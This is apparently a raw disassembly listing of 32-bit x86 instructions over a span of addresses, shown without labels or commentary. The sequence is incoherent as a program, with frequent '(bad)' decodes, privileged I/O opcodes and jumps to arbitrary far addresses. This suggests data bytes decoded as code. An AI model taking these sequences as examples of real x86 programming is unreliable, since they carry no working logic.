  528d18:	imul   edx,DWORD PTR [ebx-0x1bf93605],0xc6140383
  528d22:	in     al,0x6f
  528d24:	movaps xmm2,xmm5
  528d27:	into   
  528d28:	dec    eax
  528d29:	mov    ah,0xee
  528d2b:	jg     0x528cc1
  528d2d:	mov    ecx,0x193da58e
  528d32:	hlt    
  528d33:	pop    esp
  528d34:	int3   
  528d35:	inc    edi
  528d36:	or     eax,esp
  528d38:	rol    DWORD PTR [edx+0x3762f92a],cl
  528d3e:	retf   
  528d3f:	and    BYTE PTR [eax-0xe05bd2b],bh
  528d45:	xor    edi,edx
  528d47:	mov    ds:0x2d305d74,eax
  528d4c:	jo     0x528d25
  528d4e:	lahf   
  528d4f:	adc    al,0x6f
  528d51:	inc    ecx
  528d52:	inc    ecx
  528d53:	add    bh,bl
  528d55:	sbb    esp,DWORD PTR [edx+0x1d]
  528d58:	outs   dx,BYTE PTR ds:[esi]
  528d59:	or     ah,BYTE PTR [eax-0x77348207]
  528d5f:	mov    bh,0xa8
  528d61:	mov    eax,ds:0x2fb0d0a3
  528d66:	mov    esi,0xcfe2037d
  528d6b:	cs test eax,0x6cc38dfb
  528d71:	pop    edi
  528d72:	jnp    0x528d5c
  528d74:	and    DWORD PTR [ecx-0x58],edx
  528d77:	xor    al,0xd1
  528d79:	cdq    
  528d7a:	xchg   ecx,eax
  528d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  528d7c:	cmc    
  528d7d:	cld    
  528d7e:	test   BYTE PTR [ebx+edi*4+0x74],0xb5
  528d83:	clc    
  528d84:	xchg   BYTE PTR ds:0x1a53e0cd,cl
  528d8a:	xor    eax,0xbfdc3383
  528d8f:	adc    BYTE PTR [esi+0xfad2cca],dh
  528d95:	lahf   
  528d96:	fild   DWORD PTR [edi-0x16]
  528d99:	cmp    edx,DWORD PTR [eax+0x69757cb0]
  528d9f:	int    0xfa
  528da1:	(bad)  
  528da2:	mov    ebp,?
  528da4:	xor    ch,bl
  528da6:	hlt    
  528da7:	pop    ss
  528da8:	cmp    BYTE PTR gs:[ebp-0x155862db],0x98
  528db0:	retf   0x280f
  528db3:	mov    WORD PTR [edi],?
  528db5:	mov    edx,0xdb21734b
  528dba:	sub    al,0xc7
  528dbc:	fwait
  528dbd:	dec    esp
  528dbe:	xor    dh,ah
  528dc0:	jecxz  0x528d6c
  528dc2:	(bad)  
  528dc3:	fsub   QWORD PTR [edi+edx*2+0x336b93a2]
  528dca:	into   
  528dcb:	rcr    BYTE PTR [ebx-0x2af81eb3],0xa
  528dd2:	bound  ebx,QWORD PTR [ecx-0x4a]
  528dd5:	add    BYTE PTR [ecx-0x545c4c14],bl
  528ddb:	in     eax,0x39
  528ddd:	xor    ecx,DWORD PTR [edi]
  528ddf:	jne    0x528d6a
  528de1:	cmp    esp,eax
  528de3:	lds    eax,FWORD PTR [esp+ebx*8]
  528de6:	add    ecx,DWORD PTR [ecx-0x66]
  528de9:	test   DWORD PTR [eax+0x5f424f8b],edx
  528def:	loopne 0x528d98
  528df1:	sti    
  528df2:	dec    ecx
  528df3:	xchg   DWORD PTR [edx+eax*2+0x40647eeb],edi
  528dfa:	scas   eax,DWORD PTR es:[edi]
  528dfb:	sbb    eax,DWORD PTR [edi-0x19]
  528dfe:	sti    
  528dff:	lods   al,BYTE PTR ds:[esi]
  528e00:	sbb    DWORD PTR [esi-0x714aa43f],edx
  528e06:	and    DWORD PTR [esi+0x48ff8bfc],esi
  528e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  528e0d:	test   DWORD PTR [edi],edi
  528e0f:	xchg   BYTE PTR [edx-0x3f6e57d],ah
  528e15:	ror    esi,1
  528e17:	popf   
  528e18:	jl     0x528e05
  528e1a:	xor    cl,dh
  528e1c:	mov    edi,0x96d096a3
  528e21:	jno    0x528e65
  528e23:	fwait
  528e24:	push   edi
  528e25:	inc    edx
  528e26:	hlt    
  528e27:	adc    al,BYTE PTR [ebx]
  528e29:	test   eax,0x8ab31251
  528e2e:	aad    0xd3
  528e30:	stos   BYTE PTR es:[edi],al
  528e31:	fisttp WORD PTR ds:0x4b0b8e12
  528e37:	sub    eax,0x4319f61e
  528e3c:	dec    edi
  528e3d:	dec    edi
  528e3e:	das    
  528e3f:	in     al,0x59
  528e41:	inc    eax
  528e42:	pushf  
  528e43:	xor    edi,eax
  528e45:	test   eax,0x1b5db33b
  528e4a:	push   edx
  528e4b:	(bad)  
  528e4c:	aam    0x15
  528e4e:	sbb    BYTE PTR [esi],0x2f
  528e51:	fistp  QWORD PTR [ecx+0x5b]
  528e54:	pop    ds
  528e55:	popa   
  528e56:	inc    esi
  528e57:	popa   
  528e58:	imul   esi,ecx,0xffffffc6
  528e5b:	sub    al,0xe2
  528e5d:	sar    DWORD PTR [ecx-0x56],cl
  528e60:	ins    BYTE PTR es:[edi],dx
  528e61:	mov    dh,0xc3
  528e63:	pop    ss
  528e64:	xchg   ebp,eax
  528e65:	xor    al,0xc3
  528e67:	xchg   ecx,eax
  528e68:	or     ebp,DWORD PTR [esi-0x370c21da]
  528e6e:	inc    ebp
  528e6f:	in     eax,dx
  528e70:	sub    DWORD PTR ds:[ebp-0x20],ecx
  528e74:	retf   
  528e75:	cmp    dl,ah
  528e77:	xchg   BYTE PTR [ebx],bh
  528e79:	inc    edi
  528e7a:	pop    esi
  528e7b:	and    dh,BYTE PTR [ebx+0x44]
  528e7e:	mov    BYTE PTR [ebx],ch
  528e80:	and    eax,0x98407fb5
  528e85:	retf   0x2539
  528e88:	inc    esp
  528e89:	stos   BYTE PTR es:[edi],al
  528e8a:	in     al,dx
  528e8b:	sub    eax,0xb626c40d
  528e90:	or     BYTE PTR [eax+0x5a11f04d],dl
  528e96:	xor    DWORD PTR [ebx+edi*2+0x13faeffb],edx
  528e9d:	mov    esp,0xd580e230
  528ea2:	sbb    ebx,DWORD PTR [ecx-0x4d173781]
  528ea8:	hlt    
  528ea9:	fcmovnb st,st(3)
  528eab:	fadd   QWORD PTR [eax]
  528ead:	pop    eax
  528eae:	sbb    al,0x98
  528eb0:	mov    esp,0x512d6e0
  528eb5:	popa   
  528eb6:	fs scas al,BYTE PTR es:[edi]
  528eb8:	or     BYTE PTR [edi],ah
  528eba:	push   ebx
  528ebb:	fcmovb st,st(5)
  528ebd:	xlat   BYTE PTR ds:[ebx]
  528ebe:	bound  eax,QWORD PTR [esi+eax*4-0x76]
  528ec2:	sti    
  528ec3:	sub    dl,BYTE PTR [esi]
  528ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  528ec6:	dec    eax
  528ec7:	call   0xe5170490
  528ecc:	jmp    0x2a86:0xff017d00
  528ed3:	jecxz  0x528ef0
  528ed5:	test   ecx,ebx
  528ed7:	cmp    al,BYTE PTR [ebx]
  528ed9:	push   edx
  528eda:	cmp    DWORD PTR [edx-0x7f819177],ebx
  528ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  528ee1:	(bad)  
  528ee2:	mov    eax,ds:0x216cd752
  528ee7:	cdq    
  528ee8:	sbb    DWORD PTR [eax-0x65],ebx
  528eeb:	div    al
  528eed:	sbb    edx,edi
  528eef:	push   edi
  528ef0:	pop    esp
  528ef1:	or     al,0xe8
  528ef3:	jecxz  0x528f61
  528ef5:	pop    ss
  528ef6:	idiv   DWORD PTR [edi+0x6d3562b5]
  528efc:	mov    dl,0xe5
  528efe:	stc    
  528eff:	scas   eax,DWORD PTR es:[edi]
  528f00:	dec    esp
  528f01:	cmc    
  528f02:	rcr    DWORD PTR [esi],cl
  528f04:	push   0xffffff90
  528f06:	das    
  528f07:	cmp    al,0x7e
  528f09:	push   ecx
  528f0a:	add    dh,BYTE PTR [ebx]
  528f0c:	sub    al,0x7d
  528f0e:	cmp    ah,BYTE PTR [edi]
  528f10:	outs   dx,DWORD PTR ds:[esi]
  528f11:	ret    0xb1f3
  528f14:	sub    DWORD PTR ds:0x162c3deb,ebp
  528f1a:	dec    ebp
  528f1b:	mov    DWORD PTR [esi+ebx*2+0x76],0x365f0d32
  528f23:	lds    eax,FWORD PTR [edi-0x70f85cb1]
  528f29:	jle    0x528ebe
  528f2b:	sbb    bh,BYTE PTR [ebp+0x5767c1bc]
  528f31:	(bad)  
  528f32:	stos   BYTE PTR es:[edi],al
  528f33:	sub    dl,BYTE PTR [ecx]
  528f35:	mov    DWORD PTR [esi],ebp
  528f37:	adc    al,BYTE PTR [eax]
  528f39:	jge    0x528f51
  528f3b:	ins    DWORD PTR es:[edi],dx
  528f3c:	ret    
  528f3d:	add    BYTE PTR [ebp-0x452f17f3],bl
  528f43:	push   edx
  528f44:	dec    edx
  528f45:	inc    edx
  528f46:	mov    ds:0x16383a17,al
  528f4b:	out    0xb8,eax
  528f4d:	out    dx,eax
  528f4e:	loopne 0x528f73
  528f50:	pusha  
  528f51:	jb     0x528fb7
  528f53:	shl    DWORD PTR [edx-0x4f9efaa5],0x73
  528f5a:	nop
  528f5b:	popa   
  528f5c:	push   ebx
  528f5d:	nop
  528f5e:	xor    BYTE PTR [ecx],dl
  528f60:	sbb    eax,0x33e46afc
  528f65:	popf   
  528f66:	xchg   edi,eax
  528f67:	popf   
  528f68:	jg     0x528f8e
  528f6a:	aad    0xd8
  528f6c:	dec    esp
  528f6d:	mov    dh,bh
  528f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  528f70:	cmp    BYTE PTR [eax+0xa36a638],dh
  528f76:	sub    al,0xe7
  528f78:	xchg   ebp,eax
  528f79:	cmp    BYTE PTR [ebp+0x1f348cc6],ah
  528f7f:	push   0x57
  528f81:	cmc    
  528f82:	mov    ch,0xac
  528f84:	nop
  528f85:	outs   dx,BYTE PTR ds:[esi]
  528f86:	dec    edi
  528f87:	adc    eax,0x3fea9139
  528f8c:	(bad)  
  528f8d:	out    0xe7,al
  528f8f:	xchg   edx,eax
  528f90:	lock mov ebp,0xadadfb6a
  528f96:	push   es
  528f97:	push   cs
  528f98:	sub    dh,BYTE PTR ss:[ebp+0x150c93fb]
  528f9f:	xlat   BYTE PTR ds:[ebx]
  528fa0:	mov    bh,BYTE PTR [esp+edx*4-0x32]
  528fa4:	adc    al,0x6b
  528fa6:	push   cs
  528fa7:	inc    edi
  528fa8:	jle    0x528f63
  528faa:	dec    ebx
  528fab:	pop    eax
  528fac:	mov    ch,0x6b
  528fae:	push   esp
  528faf:	or     al,0x65
  528fb1:	scas   al,BYTE PTR es:[edi]
  528fb2:	sahf   
  528fb3:	sbb    eax,0x2c3b148e
  528fb8:	rcl    DWORD PTR [edi+0x74c33c0e],1
  528fbe:	mov    ah,0xb
  528fc0:	enter  0x5d5e,0xb
  528fc4:	sub    DWORD PTR [ebx-0x3c57f73d],esp
  528fca:	mov    bl,0x35
  528fcc:	(bad)  [eax]
  528fce:	jl     0x52903e
  528fd0:	fs sub esp,DWORD PTR gs:[ebx]
  528fd4:	cmp    eax,0x3758918d
  528fd9:	nop
  528fda:	jmp    0x4aed:0xdc5605ed
  528fe1:	xor    BYTE PTR [eax+0x5f8141c9],bh
  528fe7:	sbb    al,0xf2
  528fe9:	push   0x2474f466
  528fee:	sub    edi,edi
  528ff0:	lds    eax,FWORD PTR [ecx-0x218fb1c1]
  528ff6:	cs jle 0x528f7f
  528ff9:	cmovnp ecx,DWORD PTR [ecx]
  528ffc:	inc    edx
  528ffd:	xor    ch,BYTE PTR ds:0xaedff373
  529003:	inc    edi
  529004:	sbb    ecx,DWORD PTR [eax+edi*8]
  529007:	push   esi
  529008:	sub    al,0xc7
  52900a:	add    edi,DWORD PTR [ecx+0x29037d95]
  529010:	fnsave [edx]
  529012:	retf   0xd408
  529015:	cmp    BYTE PTR [esi-0x2b],al
  529018:	xchg   ecx,eax
  529019:	mov    ds:0xa94a6cd7,al
  52901e:	jbe    0x529082
  529020:	ss cmp ah,cl
  529023:	jbe    0x528fd0
  529025:	fild   DWORD PTR [ecx-0x5fa737c0]
  52902b:	nop
  52902c:	or     BYTE PTR [eax-0x336acfba],ah
  529032:	pop    edi
  529033:	add    BYTE PTR [esi],ah
  529035:	retf   
  529036:	add    bl,dh
  529038:	das    
  529039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52903a:	dec    ecx
  52903b:	cli    
  52903c:	arpl   WORD PTR [ecx+0x10],bx
  52903f:	fadd   DWORD PTR [esi+0x2b0e192]
  529045:	mov    edx,0x4a4714ca
  52904a:	sub    DWORD PTR [edx+0x2c],ecx
  52904d:	xchg   edi,eax
  52904e:	aam    0xd7
  529050:	mov    edi,0x7bf79d50
  529055:	sub    al,0xad
  529057:	outs   dx,BYTE PTR ds:[esi]
  529058:	xchg   dl,al
  52905a:	fidivr WORD PTR [eax]
  52905c:	or     BYTE PTR ds:0xf8ce732,dl
  529062:	stos   DWORD PTR es:[edi],eax
  529063:	add    eax,0x43f3808e
  529068:	ins    DWORD PTR es:[edi],dx
  529069:	lahf   
  52906a:	arpl   WORD PTR [edi+0x6406c265],si
  529070:	test   al,0x45
  529072:	push   ebp
  529073:	or     eax,DWORD PTR [edx]
  529075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  529076:	sbb    DWORD PTR [eax+0x48145605],eax
  52907c:	sbb    al,0xa3
  52907e:	imul   esp,esi,0x149bf6e5
  529084:	dec    ebx
  529085:	sbb    al,0x85
  529087:	(bad)  
  529088:	dec    ebp
  529089:	xor    eax,0x54bd67b4
  52908e:	fstp   TBYTE PTR [esi+eax*2]
  529091:	mov    ds:0x450495de,al
  529096:	or     esi,DWORD PTR [eax+eax*4+0x33]
  52909a:	adc    ebx,DWORD PTR [edi-0x1aa882e5]
  5290a0:	jle    0x5290f4
  5290a2:	push   esp
  5290a3:	aaa    
  5290a4:	jge    0x52909b
  5290a6:	mov    dh,0x5d
  5290a8:	add    al,0x4f
  5290aa:	add    dh,BYTE PTR cs:[eax-0x5d44c94e]
  5290b1:	out    dx,eax
  5290b2:	mov    ch,0x3f
  5290b4:	(bad)  
  5290b6:	inc    esi
  5290b7:	addr16 sbb eax,0x5ae6e7af
  5290bd:	mov    edx,0xb84e6ebc
  5290c2:	cwde   
  5290c3:	push   esp
  5290c4:	rcl    DWORD PTR [esi-0x6f7b2e9d],0x2f
  5290cb:	push   edi
  5290cc:	in     eax,0xcb
  5290ce:	shl    DWORD PTR [ebp-0x16cac3df],0x27
  5290d5:	jle    0x529107
  5290d7:	ds jl  0x529128
  5290da:	scas   al,BYTE PTR es:[edi]
  5290db:	adc    edi,esi
  5290dd:	mov    bh,0x95
  5290df:	sub    DWORD PTR [ecx-0x53801ce0],esi
  5290e5:	and    bl,BYTE PTR [ecx]
  5290e7:	mov    esp,es
  5290e9:	cmp    al,0x4d
  5290eb:	xchg   edx,eax
  5290ec:	scas   eax,DWORD PTR es:[edi]
  5290ed:	xor    BYTE PTR [eax-0x6f],0x28
  5290f1:	punpckhdq mm4,mm4
  5290f4:	push   cs
  5290f5:	aas    
  5290f6:	retf   0x841a
  5290f9:	pop    esp
  5290fa:	xchg   ecx,eax
  5290fb:	or     BYTE PTR [eax+0x3b45aeed],ah
  529101:	mov    edi,0xd6e39372
  529106:	rcl    DWORD PTR [esi+0x71],0x3d
  52910a:	jmp    0xd9337bb3
  52910f:	call   FWORD PTR [esi+0x41]
  529112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  529113:	inc    eax
  529114:	inc    ebp
  529115:	je     0x5290aa
  529117:	add    BYTE PTR [edi-0x1e5a41ee],0x8c
  52911e:	xor    ch,dh
  529120:	into   
  529121:	das    
  529122:	jl     0x529123
  529124:	add    eax,0x78f1afb1
  529129:	xchg   ebp,eax
  52912a:	stc    
  52912b:	test   al,0x3
  52912d:	pop    ecx
  52912e:	(bad)  
  52912f:	sbb    ebx,DWORD PTR [ebx-0x401b81d7]
  529135:	jb     0x529102
  529137:	pop    es
  529138:	xchg   esi,eax
  529139:	pop    esp
  52913a:	adc    al,0xe5
  52913c:	mov    BYTE PTR [edi],bh
  52913e:	cmc    
  52913f:	test   BYTE PTR fs:[edi+0x27],ch
  529143:	sub    bl,BYTE PTR [esi]
  529145:	push   ss
  529146:	dec    edi
  529147:	inc    ebp
  529148:	scas   al,BYTE PTR es:[edi]
  529149:	dec    ebx
  52914a:	loope  0x5290e3
  52914c:	push   ss
  52914d:	push   ss
  52914e:	xchg   edi,eax
  52914f:	and    BYTE PTR [ebp+0x27],al
  529152:	inc    edx
  529153:	imul   eax,DWORD PTR [edx-0x17],0x2adfb905
  52915a:	rcl    DWORD PTR [ecx+0x2e16591],cl
  529160:	inc    edx
  529161:	mov    eax,0x296c6baf
  529166:	ins    BYTE PTR es:[edi],dx
  529167:	push   ebx
  529168:	retf   0xf86e
  52916b:	jle    0x529198
  52916d:	rol    BYTE PTR gs:[ebx+esi*4-0x56716285],1
  529175:	inc    eax
  529176:	retf   0x106a
  529179:	call   0xc6e04ac7
  52917e:	(bad)  
  52917f:	test   al,0x20
  529181:	jb     0x529196
  529183:	mov    BYTE PTR [edi],dh
  529185:	in     eax,dx
  529186:	ja     0x5291a1
  529188:	sbb    cl,BYTE PTR [edi+0x65]
  52918b:	jae    0x5291a4
  52918d:	dec    ecx
  52918e:	push   ss
  52918f:	add    al,0x86
  529191:	test   BYTE PTR [eax],0xc3
  529194:	push   cs
  529195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  529196:	in     eax,0x4e
  529198:	or     DWORD PTR [edx-0xfbd4126],0x7714fd32
  5291a2:	mov    fs,WORD PTR [ebx+0x1e3d0b9a]
  5291a8:	jle    0x529156
  5291aa:	and    al,0x2
  5291ac:	ja     0x5291ff
  5291ae:	xchg   esp,eax
  5291af:	push   eax
  5291b0:	(bad)  
  5291b1:	pop    ebx
  5291b2:	adc    BYTE PTR [ebx-0x5b24c3bb],ah
  5291b8:	pop    esp
  5291b9:	ror    DWORD PTR [edx+0x102524a5],cl
  5291bf:	mov    ecx,fs
  5291c1:	pop    esp
  5291c2:	push   ebp
  5291c3:	(bad)  [edi-0x4f]
  5291c6:	jmp    0x5291cf
  5291c8:	inc    esi
  5291c9:	sub    al,0x3a
  5291cb:	adc    ch,BYTE PTR ds:0xb43c01cb
  5291d1:	mov    eax,ds:0xe71d5ca0
  5291d6:	sbb    DWORD PTR [edi+0x5e3bb748],esi
  5291dc:	mov    ah,0xd7
  5291de:	bound  edx,QWORD PTR [ebx+0x1]
  5291e1:	popa   
  5291e2:	ret    
  5291e3:	loope  0x52919f
  5291e5:	(bad)  [esi]
  5291e7:	lds    eax,FWORD PTR [ecx-0x59]
  5291ea:	fmul   st,st(2)
  5291ec:	cmp    DWORD PTR [eax],esp
  5291ee:	popf   
  5291ef:	into   
  5291f0:	(bad)  
  5291f1:	jbe    0x5291ee
  5291f3:	jg     0x529212
  5291f5:	aam    0xec
  5291f7:	lds    ecx,FWORD PTR [ebx+0x3e]
  5291fa:	or     eax,0x2449f5bc
  5291ff:	or     eax,0x6a4438cd
  529204:	or     eax,0x1efb39af
  529209:	mov    dl,0x73
  52920b:	add    al,0x3e
  52920d:	hlt    
  52920e:	jns    0x5291b0
  529210:	adc    eax,0x2f7f1ee8
  529215:	mov    ch,BYTE PTR [eax]
  529217:	mov    ch,0x3c
  529219:	jno    0x529224
  52921b:	xor    ah,BYTE PTR [ebp-0x3573336c]
  529221:	jg     0x5291ec
  529223:	jecxz  0x5291bf
  529225:	lds    esi,FWORD PTR [ebx+ecx*1-0x414154f3]
  52922c:	ret    0x47b7
  52922f:	or     esi,DWORD PTR [ecx+ebp*8+0x30a9c6b3]
  529236:	shr    DWORD PTR [esi],cl
  529238:	scas   eax,DWORD PTR es:[edi]
  529239:	in     al,0x22
  52923b:	adc    al,0x3c
  52923d:	mov    edx,0x9043607a
  529242:	in     al,0xd8
  529244:	stos   DWORD PTR es:[edi],eax
  529245:	aam    0x96
  529247:	mov    edi,0xf486fe85
  52924c:	sbb    DWORD PTR ds:0x8fbea4d5,esi
  529252:	call   0x227aaee6
  529257:	xor    al,BYTE PTR [edi-0xb]
  52925a:	or     bl,dl
  52925c:	dec    ecx
  52925d:	jle    0x52929e
  52925f:	test   DWORD PTR [ebx],edi
  529261:	jl     0x52927f
  529263:	fld    QWORD PTR [edi+eiz*1-0x62]
  529267:	xor    dl,BYTE PTR [edx-0x60a11b7c]
  52926d:	mov    bh,0xd8
  52926f:	mov    ebx,0xe6cb0ad0
  529274:	sbb    eax,0x224b40b6
  529279:	dec    esi
  52927a:	inc    ebp
  52927b:	inc    ebx
  52927c:	inc    edx
  52927d:	ret    0xc2c
  529280:	int3   
  529281:	std    
  529282:	add    esp,DWORD PTR [esi]
  529284:	or     dh,ch
  529286:	xchg   ebx,eax
  529287:	inc    edi
  529288:	mov    ds:0x75b9845,al
  52928d:	scas   eax,DWORD PTR es:[edi]
  52928e:	adc    eax,0x958a351b
  529293:	xchg   ebx,eax
  529294:	jmp    0x286f42dd
  529299:	enter  0x612e,0x8e
  52929d:	jl     0x5292cd
  52929f:	sti    
  5292a0:	xchg   ebp,eax
  5292a1:	les    eax,FWORD PTR [ecx]
  5292a3:	sub    cl,BYTE PTR [ebx-0x52]
  5292a6:	dec    esp
  5292a7:	das    
  5292a8:	mov    eax,ds:0xbca37ac5
  5292ad:	adc    eax,0x4d010026
  5292b2:	add    BYTE PTR [ebx+0x46ba4a39],dh
  5292b8:	(bad)  
  5292b9:	mov    eax,0xecb1e7d8
  5292be:	shr    DWORD PTR [ebp+0x6d],1
  5292c1:	mov    ah,0xbf
  5292c3:	cld    
  5292c4:	mov    eax,ds:0xf22d687
  5292c9:	stos   BYTE PTR es:[edi],al
  5292ca:	mov    bl,0x62
  5292cc:	mov    ds:0x9f078aa9,al
  5292d1:	sbb    BYTE PTR [ebx+0x56],bh
  5292d4:	push   eax
  5292d5:	outs   dx,BYTE PTR ds:[esi]
  5292d6:	mov    al,0xf2
  5292d8:	jg     0x5292cd
  5292da:	inc    ebp
  5292db:	sahf   
  5292dc:	jge    0x529330
  5292de:	mov    eax,ebx
  5292e0:	loope  0x5292ce
  5292e2:	test   eax,0xf72e2956
  5292e7:	adc    edi,DWORD PTR [ecx]
  5292e9:	(bad)  
  5292ea:	pop    ss
  5292eb:	push   ebp
  5292ec:	aas    
  5292ed:	push   ss
  5292ee:	lds    edi,FWORD PTR ds:0xda101ea9
  5292f4:	xchg   DWORD PTR [edx-0x7d],edi
  5292f7:	sub    al,bh
  5292f9:	or     eax,0xaec517de
  5292fe:	xchg   BYTE PTR [esi],bl
  529300:	stos   BYTE PTR es:[edi],al
  529301:	jns    0x5292f7
  529303:	xchg   edx,eax
  529304:	mov    esi,0xa847e635
  529309:	jnp    0x5292b5
  52930b:	mov    BYTE PTR [ebx+0x23],0x61
  52930f:	mov    edi,0x5abf4dc3
  529314:	push   ebp
  529315:	sub    ebp,DWORD PTR [ebx-0x7a]
  529318:	add    ah,BYTE PTR [ecx+0x7af5afb0]
  52931e:	jp     0x5292e5
  529320:	xchg   ecx,eax
  529321:	dec    ebp
  529322:	jl     0x5293a1
  529324:	xlat   BYTE PTR ds:[ebx]
  529325:	int3   
  529326:	dec    ebp
  529327:	xchg   esi,eax
  529328:	jo     0x5292ee
  52932a:	shr    DWORD PTR [ebp-0x2c5cb680],1
  529330:	stos   DWORD PTR es:[edi],eax
  529331:	mov    bl,0xba
  529333:	fcomp  DWORD PTR [ecx]
  529335:	retf   0x903f
  529338:	dec    ecx
  529339:	test   al,0x9c
  52933b:	das    
  52933c:	stc    
  52933d:	pop    ebx
  52933e:	adc    dl,BYTE PTR [edi-0x5b]
  529341:	adc    eax,DWORD PTR [eax-0x1]
  529344:	jl     0x529374
  529346:	adc    cl,BYTE PTR ds:0x35ea09b4
  52934c:	fisub  DWORD PTR [eax+0x12]
  52934f:	add    al,0x4c
  529351:	int    0x30
  529353:	ret    
  529354:	lds    eax,FWORD PTR [esi-0x6a]
  529357:	aaa    
  529358:	in     al,0xe8
  52935a:	test   DWORD PTR [edx],esp
  52935c:	scas   al,BYTE PTR es:[edi]
  52935d:	stc    
  52935e:	or     al,bh
  529360:	adc    al,0x18
  529362:	in     eax,0x7d
  529364:	inc    esp
  529365:	pop    es
  529366:	pop    es
  529367:	cli    
  529368:	in     al,0xfa
  52936a:	xchg   ecx,eax
  52936b:	fwait
  52936c:	sbb    esp,ebx
  52936e:	add    esp,edx
  529370:	add    ebx,edi
  529372:	dec    ebp
  529373:	fld    TBYTE PTR [ecx]
  529375:	jns    0x5293cb
  529377:	push   ss
  529378:	rol    DWORD PTR [esi+0x68],0x21
  52937c:	or     DWORD PTR [edx-0xce9c658],eax
  529382:	push   0xffffffe2
  529384:	(bad)  
  529385:	push   ebp
  529386:	push   esi
  529387:	jbe    0x529348
  529389:	add    al,0x27
  52938b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52938c:	call   0x2cd0:0x418ee62b
  529393:	dec    esi
  529394:	js     0x529352
  529396:	shl    al,0x1b
  529399:	jle    0x529411
  52939b:	ins    BYTE PTR es:[edi],dx
  52939c:	pop    edx
  52939d:	mov    dl,0x9a
  52939f:	pop    esi
  5293a0:	push   ebx
  5293a1:	test   dh,ch
  5293a3:	xchg   ebx,eax
  5293a4:	add    eax,0x7dd774c7
  5293a9:	pusha  
  5293aa:	sahf   
  5293ab:	pop    ecx
  5293ac:	mov    cl,0x9a
  5293ae:	jnp    0x529426
  5293b0:	add    edx,DWORD PTR [edx+0xede422b]
  5293b6:	or     eax,0xfed369a8
  5293bb:	and    DWORD PTR [ecx],esi
  5293bd:	ficomp DWORD PTR [ebx-0x7a]
  5293c0:	aaa    
  5293c1:	xchg   esi,eax
  5293c2:	push   cs
  5293c3:	pushf  
  5293c4:	(bad)  
  5293c5:	and    eax,0xfab89962
  5293ca:	and    eax,esi
  5293cc:	test   DWORD PTR [edi],ecx
  5293ce:	mov    ds:0xc171acea,al
  5293d3:	fadd   QWORD PTR [esi-0x5d]
  5293d6:	sbb    cl,BYTE PTR ds:0x798c70ae
  5293dc:	sbb    eax,esp
  5293de:	test   bh,cl
  5293e0:	xor    al,0x57
  5293e2:	sub    eax,0x4abf574d
  5293e7:	mov    al,ds:0x5247430f
  5293ec:	and    al,BYTE PTR [esi+0x54]
  5293ef:	inc    ebx
  5293f0:	push   0x4d31c0e9
  5293f5:	mov    WORD PTR [ecx-0x68b804bb],?
  5293fb:	cmp    eax,0x65d022bc
  529400:	dec    edi
  529401:	fisttp WORD PTR [ecx+0x46e8897f]
  529407:	mov    bl,0xb5
  52940a:	sbb    eax,0x374272d3
  52940f:	pop    ebp
  529410:	push   edx
  529411:	mov    esp,0xbd37dc75
  529416:	ror    DWORD PTR [esi],cl
  529418:	sbb    al,0x85
  52941a:	aaa    
  52941b:	lds    edx,FWORD PTR [edi-0x38390030]
  529421:	cmp    BYTE PTR [ebx+eax*1-0x59659b06],dl
  529428:	push   esi
  529429:	enter  0x9704,0xdb
  52942d:	xchg   ecx,eax
  52942e:	arpl   WORD PTR [ebp-0x30],di
  529431:	jno    0x529468
  529433:	push   0x39
  529435:	pushf  
  529436:	mov    DWORD PTR [eax+0x7eff7e85],ebx
  52943c:	mov    ecx,DWORD PTR ds:0x51ec48d1
  529442:	aas    
  529443:	repnz fistp DWORD PTR [edx+0x2546db10]
  52944a:	cld    
  52944b:	xor    eax,0x3bb857e
  529450:	icebp  
  529451:	sahf   
  529452:	aad    0x1f
  529454:	cmp    BYTE PTR [ebp+0x6783bfe],dh
  52945a:	inc    edi
  52945b:	jmp    0x3485:0xb58f5d69
  529462:	popf   
  529463:	pop    ecx
  529464:	cdq    
  529465:	rol    DWORD PTR [edi-0x4e],0xf2
  529469:	fistp  QWORD PTR [edx-0x41f9dc3]
  52946f:	ret    0x51af
  529472:	jae    0x529495
  529474:	cmp    BYTE PTR [esi-0x6a4887dd],ah
  52947a:	xchg   esi,eax
  52947b:	dec    ebx
  52947c:	rcl    BYTE PTR [edi+edi*4],0xb8
  529480:	push   esp
  529481:	lock xor al,0x86
  529484:	lds    esi,FWORD PTR [ecx+0x1d26332f]
  52948a:	repz dec ecx
  52948c:	hlt    
  52948d:	cmp    cl,dh
  52948f:	xlat   BYTE PTR ds:[ebx]
  529490:	and    BYTE PTR [ebp-0x582af697],dl
  529496:	into   
  529497:	jno    0x52948a
  529499:	dec    ecx
  52949a:	mov    dl,BYTE PTR [edi]
  52949c:	cmp    BYTE PTR [ecx],dh
  52949e:	enter  0x7c1d,0xc
  5294a2:	add    DWORD PTR [ecx+0x58],eax
  5294a5:	jne    0x5294bf
  5294a7:	cmp    DWORD PTR [ecx+0x44],ebp
  5294aa:	out    dx,al
  5294ab:	jae    0x529444
  5294ad:	ins    DWORD PTR es:[edi],dx
  5294ae:	sub    BYTE PTR [ebx+0x4a],0xc8
  5294b2:	pop    ecx
  5294b3:	pushf  
  5294b4:	push   eax
  5294b5:	scas   eax,DWORD PTR es:[edi]
  5294b6:	outs   dx,DWORD PTR ds:[esi]
  5294b7:	mov    cl,0xa0
  5294b9:	jge    0x529533
  5294bb:	clc    
  5294bc:	dec    ebx
  5294bd:	dec    DWORD PTR cs:[ebx+esi*1-0x688c8c51]
  5294c5:	call   0x5095:0x30c9965e
  5294cc:	xchg   esi,eax
  5294cd:	stos   BYTE PTR es:[edi],al
  5294ce:	je     0x529531
  5294d0:	sub    esi,eax
  5294d2:	ss cmp eax,0xc9b47305
  5294d8:	sub    cl,ch
  5294da:	stos   DWORD PTR es:[edi],eax
  5294db:	adc    al,0x95
  5294dd:	popa   
  5294de:	mov    ebp,0xdf6f5aed
  5294e3:	sbb    ch,0x64
  5294e6:	or     dh,ch
  5294e8:	bound  esi,QWORD PTR [edi]
  5294ea:	clc    
